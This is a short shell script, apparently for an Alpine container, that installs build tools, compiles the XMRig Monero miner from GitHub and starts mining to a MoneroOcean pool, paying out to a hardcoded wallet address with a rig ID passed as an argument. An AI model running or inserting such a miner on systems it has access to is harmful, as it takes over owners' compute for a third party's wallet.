#!/bin/sh

set -ex

# Install dependencies
apk add --no-cache git build-base cmake libuv-dev libmicrohttpd-dev openssl-dev

# Clone XMRig and build it
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake ..
make -j$(nproc)

# Start mining
./xmrig -o gulf.moneroocean.stream:10128 \
  -u 45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s \
  --rig-id "$1" --keepalive --coin xmr
